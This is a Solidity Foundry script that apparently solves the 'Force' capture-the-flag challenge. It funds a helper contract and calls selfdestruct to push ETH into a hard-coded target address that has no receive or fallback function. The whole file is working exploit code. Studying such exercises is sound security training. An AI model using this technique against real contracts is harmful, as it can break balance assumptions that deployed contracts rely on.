// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";

/**
 * @title ForceAttack
 * @author Oscar Flores
 * @dev In this challenge we are asked to force a contract that has no receive or fallback functions
 * to accept ETH. This is achieved by having another contract with some ETH to call selfdestruct with
 * the attacked contract's address.
 */

contract Martyr {
    error Martyr__NoBalance();

    address internal constant VICTIM = address(0xA50d24Ff85EA9D806F825b83F3f61a4b958C0a4d);

    constructor() payable {}

    function sacrifice() external {
        if (address(this).balance > 0) {
            selfdestruct(payable(VICTIM));
        } else {
            revert Martyr__NoBalance();
        }
    }
}

contract ForceAttack is Script {
    function run() public {
        vm.startBroadcast();
        Martyr martyr = new Martyr{value: 0.001 ether}();
        martyr.sacrifice();
        vm.stopBroadcast();
    }
}
